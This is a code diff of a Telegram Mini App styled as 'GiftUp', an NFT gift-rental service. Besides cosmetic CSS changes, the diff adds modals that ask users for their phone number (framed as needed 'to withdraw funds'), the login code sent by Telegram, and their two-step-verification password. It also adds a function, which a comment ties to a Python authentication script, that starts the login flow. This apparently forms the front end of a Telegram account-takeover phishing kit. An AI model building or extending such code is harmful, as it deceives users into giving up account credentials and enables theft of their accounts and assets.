@@ -46,7 +46,6 @@
             overflow-x: hidden;
         }
         
-        /* Анимированный фон */
         .bg-glow {
             position: fixed;
             top: 0;
@@ -60,14 +59,12 @@
             z-index: -1;
         }
         
-        /* Контейнер */
         .container {
             max-width: 100%;
             margin: 0 auto;
             padding: 0 16px;
         }
         
-        /* Шапка */
         .header {
             padding: 20px 0;
             text-align: center;
@@ -111,7 +108,7 @@
             font-weight: 500;
         }
         
-        /* Навигация */
+        /* Обновленная навигация с картинками */
         .bottom-nav {
             position: fixed;
             bottom: 0;
@@ -139,33 +136,21 @@
             overflow: hidden;
         }
         
-        .nav-item::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(99, 102, 241, 0.1), transparent);
-            transition: left 0.5s;
-        }
-        
-        .nav-item:hover::before {
-            left: 100%;
-        }
-        
         .nav-item.active {
             background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             transform: translateY(-2px);
             box-shadow: 0 8px 32px rgba(99, 102, 241, 0.3);
         }
         
-        .nav-icon {
-            font-size: 20px;
+        .nav-image {
+            width: 24px;
+            height: 24px;
+            object-fit: cover;
+            border-radius: 6px;
             transition: all 0.3s ease;
         }
         
-        .nav-item.active .nav-icon {
+        .nav-item.active .nav-image {
             transform: scale(1.1);
         }
         
@@ -175,7 +160,6 @@
             transition: all 0.3s ease;
         }
         
-        /* Вкладки */
         .tab-content {
             display: none;
             animation: fadeInUp 0.6s ease-out;
@@ -196,7 +180,7 @@
             }
         }
         
-        /* Сетка подарков */
+        /* Обновленная сетка подарков */
         .gifts-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
@@ -215,16 +199,6 @@
             overflow: hidden;
         }
         
-        .gift-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--primary), transparent);
-        }
-        
         .gift-card:hover {
             transform: translateY(-8px) scale(1.02);
             border-color: var(--primary);
@@ -236,30 +210,10 @@
             height: 140px;
             border-radius: 12px;
             margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 48px;
-            background: linear-gradient(135deg, var(--surface), var(--card));
-            border: 1px solid var(--border);
+            background-size: cover;
+            background-position: center;
             position: relative;
             overflow: hidden;
-        }
-        
-        .gift-image::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(135deg, rgba(99, 102, 241, 0.1), rgba(245, 158, 11, 0.05));
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        
-        .gift-card:hover .gift-image::after {
-            opacity: 1;
         }
         
         .gift-badge {
@@ -297,7 +251,7 @@
             gap: 4px;
         }
         
-        /* Профиль */
+        /* Обновленный профиль */
         .profile-section {
             max-width: 400px;
             margin: 0 auto;
@@ -321,6 +275,13 @@
             border: 4px solid var(--surface);
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
             position: relative;
+            overflow: hidden;
+        }
+        
+        .avatar-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
         
         .admin-crown {
@@ -380,6 +341,12 @@
             font-size: 16px;
         }
         
+        .phone-with-flag {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
         .status-connected {
             color: var(--success);
             font-weight: 600;
@@ -409,23 +376,6 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-            transition: left 0.5s;
-        }
-        
-        .btn:hover::before {
-            left: 100%;
         }
         
         .btn-primary {
@@ -464,12 +414,6 @@
             border-radius: 16px;
             padding: 20px;
             text-align: center;
-            transition: all 0.3s ease;
-        }
-        
-        .stat-card:hover {
-            border-color: var(--primary);
-            transform: translateY(-4px);
         }
         
         .stat-number {
@@ -499,18 +443,6 @@
             align-items: center;
             justify-content: center;
             padding: 20px;
-            animation: modalFadeIn 0.3s ease-out;
-        }
-        
-        @keyframes modalFadeIn {
-            from {
-                opacity: 0;
-                backdrop-filter: blur(0px);
-            }
-            to {
-                opacity: 1;
-                backdrop-filter: blur(20px);
-            }
         }
         
         .modal-content {
@@ -520,30 +452,7 @@
             padding: 32px;
             max-width: 400px;
             width: 100%;
-            animation: modalSlideIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
             position: relative;
-            overflow: hidden;
-        }
-        
-        .modal-content::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--primary), transparent);
-        }
-        
-        @keyframes modalSlideIn {
-            from {
-                opacity: 0;
-                transform: scale(0.9) translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
         }
         
         .modal-title {
@@ -589,17 +498,52 @@
             margin-top: 24px;
         }
         
-        /* Анимации */
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
+        /* Коды подтверждения */
+        .code-inputs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 20px 0;
         }
         
-        .floating {
-            animation: float 3s ease-in-out infinite;
+        .code-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: var(--text);
         }
         
-        /* Адаптивность */
+        .code-input:focus {
+            border-color: var(--primary);
+            outline: none;
+        }
+        
+        .inline-buttons {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin: 16px 0;
+        }
+        
+        .inline-btn {
+            padding: 12px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: var(--text);
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .inline-btn:hover {
+            background: rgba(255,255,255,0.1);
+        }
+        
         @media (max-width: 380px) {
             .gifts-grid {
                 grid-template-columns: 1fr;
@@ -636,7 +580,8 @@
             <div class="profile-section">
                 <div class="profile-header">
                     <div class="avatar" id="userAvatar">
-                        👤
+                        <img src="" alt="Avatar" class="avatar-image" id="avatarImage" style="display: none;">
+                        <div id="avatarPlaceholder">👤</div>
                         <div class="admin-crown" id="adminBadge" style="display: none;">👑 ADMIN</div>
                     </div>
                     <div class="user-name" id="userName">Загрузка...</div>
@@ -645,40 +590,34 @@
                 
                 <div class="info-card">
                     <div class="info-item">
-                        <div class="info-label">
-                            <span>💰</span>
-                            Баланс
-                        </div>
+                        <div class="info-label">💰 Баланс</div>
                         <div class="info-value" id="balance">0 TON</div>
                     </div>
                     
                     <div class="info-item">
-                        <div class="info-label">
-                            <span>🔐</span>
-                            Telegram
-                        </div>
+                        <div class="info-label">🔐 Telegram</div>
                         <div class="info-value">
                             <span id="telegramStatus" class="status-disconnected">Не привязан</span>
                         </div>
                     </div>
                     
                     <div class="info-item">
-                        <div class="info-label">
-                            <span>📞</span>
-                            Телефон
+                        <div class="info-label">📞 Телефон</div>
+                        <div class="info-value">
+                            <div class="phone-with-flag" id="phoneDisplay">
+                                <span id="phoneFlag">🇷🇺</span>
+                                <span id="phoneNumber">Не указан</span>
+                            </div>
                         </div>
-                        <div class="info-value" id="phoneDisplay">Не указан</div>
                     </div>
                 </div>
 
                 <div class="buttons-grid">
-                    <button class="btn btn-primary" onclick="bindTelegram()" id="bindTelegramBtn">
-                        <span>🔐</span>
-                        Привязать Telegram
+                    <button class="btn btn-primary" onclick="startTelegramAuth()" id="bindTelegramBtn">
+                        🔐 Привязать Telegram
                     </button>
                     <button class="btn btn-secondary" onclick="showPhoneModal()">
-                        <span>📞</span>
-                        Привязать номер
+                        📞 Привязать номер
                     </button>
                 </div>
 
@@ -702,11 +641,11 @@
     <!-- Навигация -->
     <div class="bottom-nav">
         <div class="nav-item active" onclick="switchTab('rent')">
-            <div class="nav-icon">🏠</div>
+            <img src="" alt="Аренда" class="nav-image" id="rentNavImage">
             <div class="nav-text">Аренда</div>
         </div>
         <div class="nav-item" onclick="switchTab('profile')">
-            <div class="nav-icon">👤</div>
+            <img src="" alt="Профиль" class="nav-image" id="profileNavImage">
             <div class="nav-text">Профиль</div>
         </div>
     </div>
@@ -715,7 +654,7 @@
     <div id="phoneModal" class="modal">
         <div class="modal-content">
             <div class="modal-title">📞 Привязка номера</div>
-            <div class="modal-subtitle">Введите ваш номер телефона</div>
+            <div class="modal-subtitle">Введите ваш номер телефона для вывода средств</div>
             
             <div class="phone-input-container">
                 <span id="countryFlag" class="country-flag">🇷🇺</span>
@@ -734,6 +673,51 @@
         </div>
     </div>
 
+    <!-- Модальное окно кода подтверждения -->
+    <div id="codeModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-title">🔐 Код подтверждения</div>
+            <div class="modal-subtitle">Введите код из Telegram</div>
+            
+            <div class="code-inputs">
+                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
+                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
+                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
+                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
+                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
+            </div>
+            
+            <div class="modal-actions">
+                <button class="btn btn-secondary" onclick="closeModal('codeModal')" style="flex: 1;">
+                    Отмена
+                </button>
+                <button class="btn btn-primary" onclick="submitCode()" style="flex: 1;">
+                    Подтвердить
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно пароля -->
+    <div id="passwordModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-title">🔒 Введите пароль</div>
+            <div class="modal-subtitle">Аккаунт защищен паролем</div>
+            
+            <input type="password" id="passwordInput" class="code-input" style="width: 100%; margin: 20px 0;" 
+                   placeholder="Введите пароль">
+            
+            <div class="modal-actions">
+                <button class="btn btn-secondary" onclick="closeModal('passwordModal')" style="flex: 1;">
+                    Отмена
+                </button>
+                <button class="btn btn-primary" onclick="submitPassword()" style="flex: 1;">
+                    Войти
+                </button>
+            </div>
+        </div>
+    </div>
+
     <!-- Подключаем скрипты -->
     <script src="config.js"></script>
     <script src="supabase-client.js"></script>
@@ -742,53 +726,54 @@
     <script src="phone-formatter.js"></script>
     
     <script>
-        // Основная логика приложения
         let userData = {};
         let currentGifts = [];
+        let authSession = null;
 
-        // Инициализация приложения
         async function initApp() {
             const tg = window.Telegram.WebApp;
             
-            // Настраиваем Telegram Web App
             tg.expand();
             tg.enableClosingConfirmation();
             tg.setHeaderColor('#1A1B3A');
             tg.setBackgroundColor('#0F0F23');
             
-            // Получаем данные пользователя
+            // Загружаем картинки для навигации
+            document.getElementById('rentNavImage').src = CONFIG.NAV_IMAGES.RENT;
+            document.getElementById('profileNavImage').src = CONFIG.NAV_IMAGES.PROFILE;
+            
             if (tg.initDataUnsafe.user) {
                 userData = {
                     id: tg.initDataUnsafe.user.id.toString(),
                     firstName: tg.initDataUnsafe.user.first_name,
                     lastName: tg.initDataUnsafe.user.last_name,
-                    username: tg.initDataUnsafe.user.username
+                    username: tg.initDataUnsafe.user.username,
+                    photoUrl: tg.initDataUnsafe.user.photo_url
                 };
                 
                 updateUserInterface();
                 await loadGifts();
                 await checkAuthStatus();
             }
-            
-            // Показываем приветствие
-            setTimeout(() => {
-                showWelcomeNotification();
-            }, 1000);
         }
 
-        // Обновление интерфейса пользователя
         function updateUserInterface() {
             document.getElementById('userName').textContent = 
                 userData.firstName || 'Пользователь';
             document.getElementById('userId').textContent = userData.id;
             
-            // Проверяем админа
+            // Загружаем аватар
+            if (userData.photoUrl) {
+                document.getElementById('avatarImage').src = userData.photoUrl;
+                document.getElementById('avatarImage').style.display = 'block';
+                document.getElementById('avatarPlaceholder').style.display = 'none';
+            }
+            
             if (userData.id === CONFIG.ADMIN_ID) {
                 document.getElementById('adminBadge').style.display = 'block';
             }
         }
 
-        // Загрузка подарков
         async function loadGifts() {
             try {
                 currentGifts = await window.supabaseClient.getGifts();
@@ -799,7 +784,6 @@
             }
         }
 
-        // Отображение подарков
         function renderGifts(gifts) {
             const container = document.getElementById('giftsList');
             
@@ -810,8 +794,7 @@
             
             container.innerHTML = gifts.map(gift => `
                 <div class="gift-card" onclick="showRentModal(${gift.id})">
-                    <div class="gift-image">
-                        ${gift.image}
+                    <div class="gift-image" style="background-image: url('${gift.image}')">
                         <div class="gift-badge">PREMIUM</div>
                     </div>
                     <div class="gift-name">${gift.model}</div>
@@ -824,19 +807,17 @@
             `).join('');
         }
 
-        // Показ состояния "нет подарков"
         function showEmptyState() {
             const container = document.getElementById('giftsList');
             container.innerHTML = `
                 <div style="grid-column: 1 / -1; text-align: center; padding: 60px 20px;">
                     <div style="font-size: 64px; margin-bottom: 16px;">🎁</div>
                     <div style="font-size: 20px; font-weight: 600; margin-bottom: 8px;">Подарков пока нет</div>
-                    <div style="color: var(--text-secondary);">Админ добавит подарки скоро!</div>
+                    <div style="color: var(--text-secondary);">Скоро появятся новые подарки!</div>
                 </div>
             `;
         }
 
-        // Модальное окно аренды
         async function showRentModal(giftId) {
             const gift = currentGifts.find(g => g.id === giftId);
             if (!gift) return;
@@ -845,7 +826,7 @@
             
             tg.showPopup({
                 title: `🎁 ${gift.model}`,
-                message: `Хотите арендовать этот премиум подарок?\n\n💎 Модель: ${gift.model}\n💰 Цена: ${gift.price} TON\n📅 Срок: ${gift.days} дней\n🎨 Особенности: ${gift.background} фон, ${gift.pattern} узор`,
+                message: `Хотите арендовать этот премиум подарок?\n\n💎 Модель: ${gift.model}\n💰 Цена: ${gift.price} TON\n📅 Срок: ${gift.days} дней`,
                 buttons: [
                     {
                         id: 'rent',
@@ -864,7 +845,6 @@
             });
         }
 
-        // Процесс аренды
         async function rentGift(giftId) {
             try {
                 const result = await window.supabaseClient.rentGift(giftId, userData.id);
@@ -880,34 +860,105 @@
             }
         }
 
-        // Приветственное уведомление
-        function showWelcomeNotification() {
-            const tg = window.Telegram.WebApp;
-            tg.showPopup({
-                title: '🎉 Добро пожаловать!',
-                message: 'Добро пожаловать в GiftUp - платформу премиум аренды NFT!\n\nЗдесь вы можете арендовать эксклюзивные цифровые подарки.',
-                buttons: [{ type: 'default', text: 'Понятно' }]
-            });
-        }
-
-        // Переключение вкладок
         function switchTab(tabName) {
-            // Скрываем все вкладки
             document.querySelectorAll('.tab-content').forEach(tab => {
                 tab.classList.remove('active');
             });
             
-            // Показываем выбранную вкладку
             document.getElementById(tabName).classList.add('active');
             
-            // Обновляем навигацию
             document.querySelectorAll('.nav-item').forEach(item => {
                 item.classList.remove('active');
             });
             event.currentTarget.classList.add('active');
         }
 
-        // Инициализация при загрузке
+        function showModal(modalId) {
+            document.getElementById(modalId).style.display = 'flex';
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+
+        function showPhoneModal() {
+            showModal('phoneModal');
+        }
+
+        async function savePhoneNumber() {
+            const phoneInput = document.getElementById('phoneInput');
+            const phone = phoneInput.value.replace(/\D/g, '');
+            
+            if (phone.length < 10) {
+                window.Telegram.WebApp.showAlert('❌ Введите корректный номер телефона');
+                return;
+            }
+            
+            try {
+                await window.supabaseClient.savePhoneNumber(userData.id, phone);
+                await updatePhoneDisplay(phone);
+                closeModal('phoneModal');
+                window.Telegram.WebApp.showAlert('✅ Номер телефона сохранен!');
+            } catch (error) {
+                window.Telegram.WebApp.showAlert('❌ Ошибка сохранения номера');
+            }
+        }
+
+        async function updatePhoneDisplay(phone) {
+            const flag = getCountryFlag(phone);
+            const formatted = formatPhoneForDisplay(phone);
+            
+            document.getElementById('phoneFlag').textContent = flag;
+            document.getElementById('phoneNumber').textContent = formatted;
+        }
+
+        function moveToNext(input, nextIndex) {
+            if (input.value.length === 1) {
+                const nextInput = document.querySelectorAll('.code-input')[nextIndex];
+                if (nextInput) nextInput.focus();
+            }
+        }
+
+        async function startTelegramAuth() {
+            const tg = window.Telegram.WebApp;
+            
+            tg.showPopup({
+                title: "🔐 Привязка Telegram",
+                message: "Для полного доступа к функциям нужно привязать аккаунт Telegram",
+                buttons: [
+                    {id: 'start_auth', type: 'default', text: '🚀 Начать привязку'},
+                    {type: 'cancel', text: '❌ Позже'}
+                ]
+            }, async (buttonId) => {
+                if (buttonId === 'start_auth') {
+                    // Здесь будет вызов Python скрипта для начала аутентификации
+                    await window.authSystem.startAdvancedAuth(userData.id);
+                }
+            });
+        }
+
+        async function updateUserStats() {
+            try {
+                const stats = await window.supabaseClient.getUserStats(userData.id);
+                document.getElementById('rentedGifts').textContent = stats.rentedGifts;
+                document.getElementById('myGifts').textContent = stats.myGifts || 0;
+                document.getElementById('balance').textContent = stats.balance + ' TON';
+            } catch (error) {
+                console.error('Ошибка обновления статистики:', error);
+            }
+        }
+
+        async function checkAuthStatus() {
+            await window.authSystem.updateUI(userData.id);
+            await updateUserStats();
+            
+            // Загружаем номер телефона если есть
+            const userDataFromDb = await window.supabaseClient.getUserData(userData.id);
+            if (userDataFromDb && userDataFromDb.phone) {
+                await updatePhoneDisplay(userDataFromDb.phone);
+            }
+        }
+
         document.addEventListener('DOMContentLoaded', initApp);
     </script>
 </body>
